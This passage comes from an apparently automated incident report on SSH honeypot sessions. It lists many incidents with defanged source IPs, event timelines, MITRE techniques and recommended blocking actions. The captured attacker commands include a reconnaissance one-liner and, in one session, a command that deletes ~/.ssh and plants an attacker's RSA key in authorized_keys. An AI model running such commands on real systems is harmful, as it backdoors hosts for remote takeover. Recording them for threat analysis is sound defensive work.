| `2026-07-09 13:55:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70cc3dd21010

| Field | Detail |
|---|---|
| **Source IP** | `138.118.215[.]192` |
| **First Seen** | 2026-07-09 13:55 |
| **Last Seen** | 2026-07-09 13:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:55:09` | `cowrie.session.connect` |
| `2026-07-09 13:55:10` | `cowrie.client.version` |
| `2026-07-09 13:55:10` | `cowrie.client.kex` |
| `2026-07-09 13:55:12` | `cowrie.login.success` |
| `2026-07-09 13:55:13` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.215[.]192` to AbuseIPDB if not already reported
- [ ] Block `138.118.215[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1cf3397612d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:56 |
| **Last Seen** | 2026-07-09 13:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:56:11` | `cowrie.session.connect` |
| `2026-07-09 13:56:11` | `cowrie.client.version` |
| `2026-07-09 13:56:11` | `cowrie.client.kex` |
| `2026-07-09 13:56:12` | `cowrie.login.success` |
| `2026-07-09 13:56:14` | `cowrie.session.params` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.success` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.command.input` |
| `2026-07-09 13:56:14` | `cowrie.log.closed` |
| `2026-07-09 13:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-177848d58d83

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 13:56 |
| **Last Seen** | 2026-07-09 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:56:44` | `cowrie.session.connect` |
| `2026-07-09 13:56:44` | `cowrie.client.version` |
| `2026-07-09 13:56:44` | `cowrie.client.kex` |
| `2026-07-09 13:56:44` | `cowrie.login.success` |
| `2026-07-09 13:56:45` | `cowrie.session.params` |
| `2026-07-09 13:56:45` | `cowrie.command.input` |
| `2026-07-09 13:56:45` | `cowrie.log.closed` |
| `2026-07-09 13:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b126e9fe5270

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 13:56 |
| **Last Seen** | 2026-07-09 13:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:56:53` | `cowrie.session.connect` |
| `2026-07-09 13:56:54` | `cowrie.client.version` |
| `2026-07-09 13:56:54` | `cowrie.client.kex` |
| `2026-07-09 13:56:58` | `cowrie.login.success` |
| `2026-07-09 13:57:01` | `cowrie.session.params` |
| `2026-07-09 13:57:01` | `cowrie.command.input` |
| `2026-07-09 13:57:03` | `cowrie.log.closed` |
| `2026-07-09 13:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c90f51adb2c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:58 |
| **Last Seen** | 2026-07-09 13:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:58:19` | `cowrie.session.connect` |
| `2026-07-09 13:58:19` | `cowrie.client.version` |
| `2026-07-09 13:58:19` | `cowrie.client.kex` |
| `2026-07-09 13:58:21` | `cowrie.login.success` |
| `2026-07-09 13:58:23` | `cowrie.session.params` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.success` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.command.input` |
| `2026-07-09 13:58:23` | `cowrie.log.closed` |
| `2026-07-09 13:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e330bfcc128

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:00 |
| **Last Seen** | 2026-07-09 14:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:00:31` | `cowrie.session.connect` |
| `2026-07-09 14:00:31` | `cowrie.client.version` |
| `2026-07-09 14:00:31` | `cowrie.client.kex` |
| `2026-07-09 14:00:33` | `cowrie.login.success` |
| `2026-07-09 14:00:34` | `cowrie.session.params` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.success` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.command.input` |
| `2026-07-09 14:00:34` | `cowrie.log.closed` |
| `2026-07-09 14:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ad1a6fe06a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:02 |
| **Last Seen** | 2026-07-09 14:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:02:39` | `cowrie.session.connect` |
| `2026-07-09 14:02:39` | `cowrie.client.version` |
| `2026-07-09 14:02:39` | `cowrie.client.kex` |
| `2026-07-09 14:02:41` | `cowrie.login.success` |
| `2026-07-09 14:02:43` | `cowrie.session.params` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.success` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.command.input` |
| `2026-07-09 14:02:43` | `cowrie.log.closed` |
| `2026-07-09 14:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5de3df4d8c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:03 |
| **Last Seen** | 2026-07-09 14:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:03:39` | `cowrie.session.connect` |
| `2026-07-09 14:03:39` | `cowrie.client.version` |
| `2026-07-09 14:03:39` | `cowrie.client.kex` |
| `2026-07-09 14:03:39` | `cowrie.login.success` |
| `2026-07-09 14:03:39` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:03:39` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9290716ea78a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:04 |
| **Last Seen** | 2026-07-09 14:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:04:45` | `cowrie.session.connect` |
| `2026-07-09 14:04:45` | `cowrie.client.version` |
| `2026-07-09 14:04:45` | `cowrie.client.kex` |
| `2026-07-09 14:04:47` | `cowrie.login.success` |
| `2026-07-09 14:04:48` | `cowrie.session.params` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.success` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:48` | `cowrie.command.input` |
| `2026-07-09 14:04:49` | `cowrie.log.closed` |
| `2026-07-09 14:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dc7688b47c1

| Field | Detail |
|---|---|
| **Source IP** | `210.212.136[.]3` |
| **First Seen** | 2026-07-09 14:05 |
| **Last Seen** | 2026-07-09 14:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:05:06` | `cowrie.session.connect` |
| `2026-07-09 14:05:06` | `cowrie.client.version` |
| `2026-07-09 14:05:06` | `cowrie.client.kex` |
| `2026-07-09 14:05:07` | `cowrie.login.success` |
| `2026-07-09 14:05:08` | `cowrie.session.params` |
| `2026-07-09 14:05:08` | `cowrie.command.input` |
| `2026-07-09 14:05:08` | `cowrie.command.failed` |
| `2026-07-09 14:05:08` | `cowrie.log.closed` |
| `2026-07-09 14:05:09` | `cowrie.session.params` |
| `2026-07-09 14:05:09` | `cowrie.command.input` |
| `2026-07-09 14:05:09` | `cowrie.session.file_download` |
| `2026-07-09 14:05:09` | `cowrie.log.closed` |
| `2026-07-09 14:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.212.136[.]3` to AbuseIPDB if not already reported
- [ ] Block `210.212.136[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137eeb647fed

| Field | Detail |
|---|---|
| **Source IP** | `210.212.136[.]3` |
| **First Seen** | 2026-07-09 14:05 |
| **Last Seen** | 2026-07-09 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:05:10` | `cowrie.session.connect` |
| `2026-07-09 14:05:10` | `cowrie.client.version` |
| `2026-07-09 14:05:10` | `cowrie.client.kex` |
| `2026-07-09 14:05:11` | `cowrie.login.success` |
| `2026-07-09 14:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.212.136[.]3` to AbuseIPDB if not already reported
- [ ] Block `210.212.136[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542ef0a632c5

| Field | Detail |
|---|---|
| **Source IP** | `210.212.136[.]3` |
| **First Seen** | 2026-07-09 14:05 |
| **Last Seen** | 2026-07-09 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:05:11` | `cowrie.session.connect` |
| `2026-07-09 14:05:11` | `cowrie.client.version` |
| `2026-07-09 14:05:11` | `cowrie.client.kex` |
| `2026-07-09 14:05:12` | `cowrie.login.success` |
| `2026-07-09 14:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.212.136[.]3` to AbuseIPDB if not already reported
- [ ] Block `210.212.136[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6231548999e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:06 |
| **Last Seen** | 2026-07-09 14:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:06:51` | `cowrie.session.connect` |
| `2026-07-09 14:06:51` | `cowrie.client.version` |
| `2026-07-09 14:06:51` | `cowrie.client.kex` |
| `2026-07-09 14:06:52` | `cowrie.login.success` |
| `2026-07-09 14:06:54` | `cowrie.session.params` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.success` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.command.input` |
| `2026-07-09 14:06:54` | `cowrie.log.closed` |
| `2026-07-09 14:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170861410a45

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 14:07 |
| **Last Seen** | 2026-07-09 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:07:44` | `cowrie.session.connect` |
| `2026-07-09 14:07:44` | `cowrie.client.version` |
| `2026-07-09 14:07:44` | `cowrie.client.kex` |
| `2026-07-09 14:07:45` | `cowrie.login.success` |
| `2026-07-09 14:07:46` | `cowrie.session.params` |
| `2026-07-09 14:07:46` | `cowrie.command.input` |
| `2026-07-09 14:07:46` | `cowrie.log.closed` |
| `2026-07-09 14:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39921578a31

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 14:07 |
| **Last Seen** | 2026-07-09 14:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:07:54` | `cowrie.session.connect` |
| `2026-07-09 14:07:55` | `cowrie.client.version` |
| `2026-07-09 14:07:55` | `cowrie.client.kex` |
| `2026-07-09 14:08:01` | `cowrie.login.success` |
| `2026-07-09 14:08:05` | `cowrie.session.params` |
| `2026-07-09 14:08:05` | `cowrie.command.input` |
| `2026-07-09 14:08:06` | `cowrie.log.closed` |
| `2026-07-09 14:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e2baec233d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:08 |
| **Last Seen** | 2026-07-09 14:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:08:56` | `cowrie.session.connect` |
| `2026-07-09 14:08:56` | `cowrie.client.version` |
| `2026-07-09 14:08:56` | `cowrie.client.kex` |
| `2026-07-09 14:08:58` | `cowrie.login.success` |
| `2026-07-09 14:08:59` | `cowrie.session.params` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.success` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:08:59` | `cowrie.command.input` |
| `2026-07-09 14:09:00` | `cowrie.log.closed` |
| `2026-07-09 14:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e413f4ffdf

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:09 |
| **Last Seen** | 2026-07-09 14:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:09:09` | `cowrie.session.connect` |
| `2026-07-09 14:09:09` | `cowrie.client.version` |
| `2026-07-09 14:09:09` | `cowrie.client.kex` |
| `2026-07-09 14:09:09` | `cowrie.login.success` |
| `2026-07-09 14:09:09` | `cowrie.direct-tcpip.request` |
